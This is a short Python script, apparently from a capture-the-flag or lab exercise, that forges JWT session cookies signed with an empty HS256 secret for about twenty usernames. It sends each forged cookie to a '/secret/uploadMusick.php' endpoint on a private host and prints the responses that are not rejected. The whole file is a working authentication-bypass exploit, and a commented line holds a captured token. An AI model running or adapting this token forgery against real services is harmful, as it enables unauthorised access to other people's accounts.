import jwt
import time
#from datetime import datetime, timedelta, timezone
#from jwt.utils import get_int_from_datetime
import requests


#header = {'Cookie' : 'jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiR19UcnVqaWxsbyIsImVtYWlsIjoiR19UcnVqaWxsb0BjaXR5LnN0ZiIsImlzcyI6IkdUcnVqaWxsby5jaXR5LnN0ZiIsImF1ZCI6IkdfVHJ1amlsbG8iLCJpYXQiOjE2ODMxMDM1MzAsImV4cCI6MTY4MzA0NTM1Nn0.8cJQ2hOB2vTfBOQ_vc69jd9kn6LmaHuuAaw7c2VgevM'}
requests.packages.urllib3.disable_warnings()
#resp = requests.request("GET", url=r"http://10.126.11.133/secret/uploadMusick.php", headers=header, verify=False, allow_redirects=False)
#print(resp.text)

user_list = ["L_Parrish", "L_Mayo ", "D_Frost ", "W_Bush", "K_Spence", "G_Trujillo", "C_Parsons", "T_Santos", "J_Chan", "D_Estrada", "M_Donovan", "D_Mcmillan", "S_Harris", "R_Mills", "G_Clarke", "B_Rice" , "L_Dalton", "T_Summers", "T_Fuller", "N_Herman", "R_Hewitt", "E_Soto"]
mess_head = {
    "typ": "JWT",
    "alg": "HS256"
}
for i in user_list:
    iss_a = i.replace('_', '')
    mess_body = {
        "name": i,
        "email": f"{i}@city.stf",
        "iss": f'{iss_a}.city.stf',
        "aud": i,
        'iat': time.time(),
        'exp': time.time()+3600
    }
    mess_jwt = jwt.encode(mess_body, "", algorithm="HS256", headers=mess_head)

    my_headers = {'Host' : '10.126.11.133',
               'Cookie' : f'jwt={mess_jwt}'}
    resp = requests.Session().get(url="http://smashmusic.city.stf/secret/uploadMusick.php", headers=my_headers, verify=False, allow_redirects=False)
    print(mess_body["name"])
    print(mess_body["iss"])
    if "Token is invalid" not in resp.text:
        print(resp.text)
    print("____________________________________________________")
    #print(resp.content)
    
